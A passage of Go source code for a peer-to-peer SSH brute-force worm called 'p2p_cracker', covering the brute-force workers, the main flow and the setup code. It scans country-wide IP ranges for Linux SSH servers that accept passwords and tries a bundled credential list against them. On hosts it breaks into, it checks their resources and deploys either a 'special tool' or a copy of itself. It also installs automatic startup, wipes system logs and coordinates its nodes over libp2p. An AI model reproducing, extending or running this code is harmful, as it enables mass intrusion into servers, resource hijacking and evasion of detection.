			log.Printf("[BLOCK] Claimed cred block for %s: lines %d-%d (local)", country, off, end-1)
		}
		return block, nil
	}

	acquired, err := n.acquireCredLock(country)
	if err != nil {
		return nil, err
	}
	if !acquired {
		return nil, fmt.Errorf("could not acquire cred lock for %s", country)
	}
	defer n.releaseCredLock(country)
	off, err := n.getCredOffset(country)
	if err != nil {
		return nil, err
	}
	if off >= n.totalCreds {
		if verbose {
			log.Printf("[BLOCK] No more credentials for %s", country)
		}
		return nil, nil
	}
	end := off + credBlockSize
	if end > n.totalCreds {
		end = n.totalCreds
	}
	block, _, err := n.credStreamer.ReadBlock(credBlockSize)
	if err != nil {
		return nil, err
	}
	if err := n.setCredOffset(country, end); err != nil {
		return nil, err
	}
	if verbose {
		log.Printf("[BLOCK] Claimed cred block for %s: lines %d-%d (DHT)", country, off, end-1)
	}
	return block, nil
}

// ===================== Brute workers =====================
func (n *P2PNode) startWorkers() {
	for i := 0; i < n.bruteWorkers; i++ {
		n.workerWg.Add(1)
		go func(workerID int) {
			defer n.workerWg.Done()
			attemptCount := 0
			for job := range n.jobCh {
				addr := fmt.Sprintf("%s:22", job.ip)
				ok, _ := checkSSH(addr, job.user, job.pass, n.sshTimeout)
				attemptCount++
				if attemptCount%100 == 0 {
					log.Printf("[BRUTE] Worker %d performed %d attempts so far", workerID, attemptCount)
				}
				if ok {
					job.acc.mu.Lock()
					job.acc.m[job.ip] = append(job.acc.m[job.ip], bruteResult{job.ip, job.user, job.pass})
					job.acc.mu.Unlock()
					log.Printf("[SUCCESS] %s | %s:%s", job.ip, job.user, job.pass)
				}
				if n.bruteDelay > 0 {
					time.Sleep(n.bruteDelay)
				}
				job.wg.Done()
			}
		}(i)
	}
}

func checkSSH(addr, user, pass string, timeout time.Duration) (bool, string) {
	config := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         timeout,
	}
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return false, err.Error()
	}
	defer conn.Close()
	sshConn, chans, reqs, err := ssh.NewClientConn(conn, addr, config)
	if err != nil {
		return false, err.Error()
	}
	defer sshConn.Close()
	client := ssh.NewClient(sshConn, chans, reqs)
	if client != nil {
		client.Close()
		return true, "ok"
	}
	return false, "client failed"
}

// ===================== Main flow =====================
func (n *P2PNode) run() {
	n.stateMu.RLock()
	country := n.state.Country
	validIPs := n.state.ValidIPs
	n.stateMu.RUnlock()
	if country != "" && len(validIPs) > 0 {
		log.Printf("[RESUME] Resuming work on country %s with %d SSH servers", country, len(validIPs))
		n.processCountry(country, validIPs)
		return
	}
	failCount := make(map[string]int)
	for {
		select {
		case <-n.ctx.Done():
			return
		default:
		}
		var country string
		for _, c := range n.countryCodes {
			if failCount[c] < 3 {
				country = c
				break
			}
		}
		if country == "" {
			log.Printf("[FATAL] All countries failed 3 times, giving up")
			return
		}
		log.Printf("[COUNTRY] Selected country: %s", country)
		cidrFile := filepath.Join(n.ipDir, country+".txt")
		cidrs, err := loadCIDRs(cidrFile)
		if err != nil {
			log.Printf("[WARN] Failed to load CIDRs for %s: %v", country, err)
			failCount[country]++
			continue
		}
		var openIPs map[string]struct{}
		var totalScanned int
		if useSynScan {
			openIPs, totalScanned = fastSynScan(cidrs, synScanRate, synIface, synMaxRTT)
			if len(openIPs) == 0 && totalScanned > 1000 {
				log.Printf("[WARN] SYN scan returned no results, falling back to TCP connect scan")
				openIPs, totalScanned = fastTCPConnectScan(cidrs, n.portScanWorkers, n.scanTimeout)
			}
		} else {
			openIPs, totalScanned = fastTCPConnectScan(cidrs, n.portScanWorkers, n.scanTimeout)
		}
		if len(openIPs) == 0 {
			log.Printf("[COUNTRY] No open port 22 found for %s (scanned %d IPs)", country, totalScanned)
			failCount[country]++
			continue
		}
		log.Printf("[SCAN] Found %d potential SSH servers (port 22 open)", len(openIPs))
		var newValid []string
		checked := 0
		for ip := range openIPs {
			checked++
			if checked%50 == 0 {
				log.Printf("[SCAN-PROGRESS] Checked %d/%d IPs for SSH service", checked, len(openIPs))
			}
			if n.isBlacklisted(ip) {
				n.debugLog("[SKIP] %s is blacklisted", ip)
				continue
			}
			if n.checkIPWithRetries(ip) {
				client, err := sshConnect(ip+":22", "invalid_user", "invalid_password", n.phase2Timeout)
				if err == nil {
					if isLinuxTarget(client) {
						newValid = append(newValid, ip)
						log.Printf("[VALID] %s is Linux SSH server", ip)
					} else {
						n.addToBlacklist(ip)
						log.Printf("[SKIP] %s is not Linux (blacklisted)", ip)
					}
					client.Close()
				} else {
					log.Printf("[ERROR] Could not connect to %s for OS detection: %v", ip, err)
				}
			} else {
				log.Printf("[SKIP] %s does not support password auth", ip)
			}
		}
		log.Printf("[SCAN] Found %d valid Linux SSH servers (password auth enabled)", len(newValid))
		if len(newValid) == 0 {
			failCount[country]++
			continue
		}
		failCount[country] = 0
		n.stateMu.Lock()
		n.state = &NodeState{Country: country, ValidIPs: newValid, CredOffset: 0}
		n.state.save(n.encKey)
		n.stateMu.Unlock()
		done := n.processCountry(country, newValid)
		if done {
			log.Printf("[DONE] Country %s finished", country)
			n.stateMu.Lock()
			n.state = &NodeState{}
			n.state.save(n.encKey)
			n.stateMu.Unlock()
		} else {
			return
		}
	}
}

func (n *P2PNode) processCountry(country string, validIPs []string) bool {
	log.Printf("[PROCESS] Starting brute force on %d IPs with credentials from %s", len(validIPs), country)
	blockNum := 0
	for {
		select {
		case <-n.ctx.Done():
			return false
		default:
		}
		block, err := n.claimNextCredBlock(country)
		if err != nil {
			log.Printf("[BLOCK] Error claiming cred block: %v", err)
			time.Sleep(1 * time.Second)
			continue
		}
		if len(block) == 0 {
			log.Printf("[BLOCK] No more credentials for %s", country)
			return true
		}
		blockNum++
		log.Printf("[BLOCK] Processing block %d with %d credentials", blockNum, len(block))
		acc := &blockAccumulator{m: make(map[string][]bruteResult)}
		wg := &sync.WaitGroup{}
		totalAttempts := len(validIPs) * len(block)
		wg.Add(totalAttempts)
		attemptIdx := 0
		for _, ip := range validIPs {
			for _, line := range block {
				parts := strings.SplitN(line, ":", 2)
				if len(parts) != 2 {
					wg.Done()
					continue
				}
				attemptIdx++
				if attemptIdx%1000 == 0 {
					log.Printf("[BRUTE-PROGRESS] Queued %d/%d attempts", attemptIdx, totalAttempts)
				}
				n.jobCh <- blockJob{ip: ip, user: parts[0], pass: parts[1], wg: wg, acc: acc}
			}
		}
		log.Printf("[BRUTE] Waiting for %d authentication attempts to complete...", totalAttempts)
		wg.Wait()
		log.Printf("[BRUTE] Block %d completed. Successful logins: %d", blockNum, len(acc.m))
		for ip, creds := range acc.m {
			if len(creds) == 0 {
				continue
			}
			first := creds[0]
			log.Printf("[POST] Connecting to %s with %s:%s for evaluation", ip, first.user, first.pass)
			client, err := sshConnect(ip+":22", first.user, first.pass, 10*time.Second)
			if err != nil {
				n.logError(fmt.Sprintf("post-exploit connect %s failed: %v", ip, err))
				continue
			}
			serverInfo, err := evaluateServer(client, first.user, first.pass)
			client.Close()
			if err != nil {
				log.Printf("[EVAL] Evaluation failed for %s: %v", ip, err)
				continue
			}
			if !serverInfo.Suitable {
				log.Printf("[EVAL] %s unsuitable: root=%s cores=%d internet=%v", ip, serverInfo.RootAccess, serverInfo.CPUCores, serverInfo.InternetOK)
				continue
			}
			log.Printf("[DEPLOY] %s is suitable (root=%s, cores=%d, internet=%v). Deploying...", ip, serverInfo.RootAccess, serverInfo.CPUCores, serverInfo.InternetOK)
			if serverInfo.CPUCores > 4 {
				if err := deploySpecialTool(ip, first.user, first.pass, n.xDir, n); err != nil {
					n.logError(fmt.Sprintf("deploySpecialTool %s failed: %v", ip, err))
				} else {
					log.Printf("[DEPLOY] Special tool deployed on %s", ip)
				}
			} else {
				if err := deployNewNode(ip, first.user, first.pass, n); err != nil {
					n.logError(fmt.Sprintf("deployNewNode %s failed: %v", ip, err))
				} else {
					log.Printf("[DEPLOY] New node deployed on %s", ip)
				}
			}
		}
	}
}

func (n *P2PNode) checkIPWithRetries(ip string) bool {
	for i := 0; i < n.authRetries; i++ {
		if !isSSH(ip, 22, n.phase2Timeout) {
			return false
		}
		if supportsPasswordAuth(ip, 22, n.phase2Timeout) {
			return true
		}
		time.Sleep(200 * time.Millisecond)
	}
	return false
}

// ===================== Main =====================
func main() {
	flag.BoolVar(&testMode, "test", false, "Test mode (skip license & DHT)")
	flag.BoolVar(&verbose, "v", true, "Verbose logging")
	flag.IntVar(&portScanWorkers, "port-scan-workers", 500, "Workers for TCP connect fallback")
	flag.IntVar(&authWorkers, "auth-workers", 50, "Workers for auth check")
	flag.IntVar(&authRetries, "auth-retries", 5, "Retries for auth check")
	flag.IntVar(&bruteWorkers, "brute-workers", runtime.NumCPU()*4, "Brute force workers")
	flag.DurationVar(&scanTimeout, "scan-timeout", 2*time.Second, "TCP connect timeout")
	flag.DurationVar(&phase2Timeout, "phase2-timeout", 6*time.Second, "Auth check timeout")
	flag.DurationVar(&sshTimeout, "ssh-timeout", 5*time.Second, "SSH auth timeout")
	flag.DurationVar(&bruteDelay, "brute-delay", 100*time.Millisecond, "Delay between attempts")
	flag.BoolVar(&useSynScan, "syn", false, "Use SYN scan (requires libpcap and administrator)")
	flag.IntVar(&synScanRate, "scan-rate", 1500, "SYN scan packets per second (used by gomap)")
	flag.StringVar(&synIface, "interface", "", "Network interface (gomap auto-detects)")
	flag.DurationVar(&synMaxRTT, "syn-rtt", 2*time.Second, "Maximum RTT for SYN-ACK (gomap timeout)")
	flag.Parse()

	lic, err := loadAndVerifyLicense()
	if err != nil {
		log.Fatal(err)
	}

	if !testMode {
		if _, err := os.Stat("/etc/systemd/system/p2p_cracker.service"); os.IsNotExist(err) && runtime.GOOS == "linux" {
			setupAutoStart()
		} else if runtime.GOOS == "windows" {
			setupAutoStart()
		}
	}
	cleanSystemLogs()

	ipDir := filepath.Join(os.TempDir(), "p2pcrack_ip")
	credsDir := filepath.Join(os.TempDir(), "p2pcrack_creds")
	xDir := filepath.Join(os.TempDir(), "p2pcrack_x")
	os.RemoveAll(ipDir)
	os.MkdirAll(ipDir, 0755)
	os.RemoveAll(credsDir)
	os.MkdirAll(credsDir, 0755)
	os.RemoveAll(xDir)
	os.MkdirAll(xDir, 0755)
	log.Println("[INIT] Extracting ip_ranges.zip...")
	if err := extractZip("ip_ranges.zip", ipDir); err != nil {
		log.Fatal(err)
	}
	log.Println("[INIT] Extracting creds.zip...")
	if err := extractZip("creds.zip", credsDir); err != nil {
		log.Fatal(err)
	}
	log.Println("[INIT] Extracting x.zip...")
	if err := extractZip("x.zip", xDir); err != nil {
		log.Fatal(err)
	}
	credFile := filepath.Join(credsDir, "all.txt")

	countryCodes, err := getCountryCodes(ipDir)
	if err != nil {
		log.Fatal(err)
	}
	if len(countryCodes) == 0 {
		log.Fatal("no country files in ip_ranges.zip")
	}
	log.Printf("[COUNTRIES] Available: %v", countryCodes)

	var priv crypto.PrivKey
	if data, err := loadEncrypted(identityFile, lic.SymmetricKey); err == nil {
		priv, err = crypto.UnmarshalPrivateKey(data)
		if err != nil {
			log.Fatal("identity file corrupted")
		}
		log.Println("[IDENTITY] Loaded existing identity")
	} else {
		priv, _, err = crypto.GenerateKeyPair(crypto.Ed25519, -1)
		if err != nil {
			log.Fatal(err)
		}
		raw, _ := crypto.MarshalPrivateKey(priv)
		if err := saveEncrypted(identityFile, raw, lic.SymmetricKey); err != nil {
			log.Fatal(err)
		}
		log.Println("[IDENTITY] Generated new identity")
	}
	encKey, _ := deriveKey(priv)

	var state *NodeState
	if data, err := loadEncrypted(stateFile, encKey); err == nil {
		state = &NodeState{}
		json.Unmarshal(data, state)
		log.Printf("[STATE] Loaded previous state: country=%s, %d valid IPs", state.Country, len(state.ValidIPs))
	} else {
		state = &NodeState{}
		log.Println("[STATE] No previous state, starting fresh")
	}
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	var node *P2PNode
	if testMode {
		allCreds, err := loadCredLines(credFile)
		if err != nil {
			log.Fatal(err)
		}
		log.Printf("[TEST] Loaded %d credentials into memory", len(allCreds))
		node = &P2PNode{
			ctx:             ctx,
			cancel:          cancel,
			state:           state,
			allCreds:        allCreds,
			totalCreds:      len(allCreds),
			ipDir:           ipDir,
			credsDir:        credsDir,
			xDir:            xDir,
			countryCodes:    countryCodes,
			portScanWorkers: portScanWorkers,
			authWorkers:     authWorkers,
			authRetries:     authRetries,
			bruteWorkers:    bruteWorkers,
			scanTimeout:     scanTimeout,
			phase2Timeout:   phase2Timeout,
			sshTimeout:      sshTimeout,
			bruteDelay:      bruteDelay,
			jobCh:           make(chan blockJob, bruteWorkers*2),
			encKey:          encKey,
			symKey:          lic.SymmetricKey,
		}
	} else {
		log.Println("[PROD] Initializing credential streamer (mmap)...")
		credStreamer, err := newCredentialStreamer(credFile)
		if err != nil {
			log.Fatal(err)
		}
		defer credStreamer.Close()
		totalLines, err := countLines(credFile)
		if err != nil {
			log.Fatal(err)
		}
		log.Printf("[PROD] Total credentials available: %d", totalLines)

		var bootstraps []multiaddr.Multiaddr
		if data, err := os.ReadFile("peers.txt"); err == nil {
			lines := strings.Split(string(data), "\n")
			plainValid := true
			for _, line := range lines {
				line = strings.TrimSpace(line)
				if line == "" {
					continue
				}
				if _, err := multiaddr.NewMultiaddr(line); err != nil {
					plainValid = false
					break
				}
			}
			if plainValid {
				for _, line := range lines {
					line = strings.TrimSpace(line)
					if line == "" {
						continue
					}
					ma, _ := multiaddr.NewMultiaddr(line)
					bootstraps = append(bootstraps, ma)
				}
				log.Printf("[P2P] Loaded %d plain bootstrap peers", len(bootstraps))
			} else {
				if dec, err := decryptAES(data, lic.SymmetricKey); err == nil {
					for _, line := range strings.Split(string(dec), "\n") {
						line = strings.TrimSpace(line)
						if line == "" {
							continue
						}
						ma, err := multiaddr.NewMultiaddr(line)
						if err != nil {
							continue
						}
						bootstraps = append(bootstraps, ma)
					}
					log.Printf("[P2P] Loaded %d encrypted bootstrap peers", len(bootstraps))
				}
			}
		}
		host, err := libp2p.New(libp2p.ListenAddrStrings("/ip4/0.0.0.0/tcp/0"), libp2p.Identity(priv))
		if err != nil {
			log.Fatal(err)
		}
		log.Printf("[P2P] Host ID: %s", host.ID())
		dht, err := kaddht.New(ctx, host, kaddht.Mode(kaddht.ModeServer))
		if err != nil {
			log.Fatal(err)
		}
		if err := dht.Bootstrap(ctx); err != nil {
			log.Fatal(err)
		}
		for _, ma := range bootstraps {
			pi, _ := peer.AddrInfoFromP2pAddr(ma)
			if err := host.Connect(ctx, *pi); err != nil {
				log.Printf("[P2P] Failed to connect to bootstrap %s: %v", ma, err)
			} else {
				log.Printf("[P2P] Connected to bootstrap %s", ma)
			}
		}
		ps, err := pubsub.NewGossipSub(ctx, host)
		if err != nil {
			log.Fatal(err)
		}
		resTopic, _ := ps.Join("results")
		node = &P2PNode{
			ctx:             ctx,
			cancel:          cancel,
			host:            host,
			dht:             dht,
			ps:              ps,
			resTopic:        resTopic,
			privKey:         priv,
			encKey:          encKey,
			symKey:          lic.SymmetricKey,
			state:           state,
			credStreamer:    credStreamer,
			ipDir:           ipDir,
			credsDir:        credsDir,
			xDir:            xDir,
			countryCodes:    countryCodes,
			portScanWorkers: portScanWorkers,
			authWorkers:     authWorkers,
			authRetries:     authRetries,
			bruteWorkers:    bruteWorkers,
			scanTimeout:     scanTimeout,
			phase2Timeout:   phase2Timeout,
			sshTimeout:      sshTimeout,
			bruteDelay:      bruteDelay,
			jobCh:           make(chan blockJob, bruteWorkers*2),
			totalCreds:      totalLines,
		}
	}

	node.startWorkers()
	log.Println("[START] Node workers started")

	shutdown := func() {
		log.Println("[SHUTDOWN] Saving state and shutting down...")
		node.closeJobChannel()
		node.workerWg.Wait()
		if !testMode {
			node.stateMu.Lock()
			node.state.save(node.encKey)
			node.stateMu.Unlock()
			log.Println("[SHUTDOWN] State saved")
		}
		log.Println("[SHUTDOWN] Cleanup complete")
	}
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		log.Println("[SIGNAL] Interrupt received")
		cancel()
		shutdown()
		os.Exit(0)
	}()
	node.run()
	cancel()
	shutdown()
}

func loadCredLines(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var lines []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		l := strings.TrimSpace(sc.Text())
		if l != "" {
			lines = append(lines, l)
		}
	}
	return lines, sc.Err()
}

func countLines(path string) (int, error) {
	f, err := os.Open(path)
	if err != nil {
		return 0, err
	}
	defer f.Close()
	count := 0
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		count++
	}
	return count, sc.Err()
}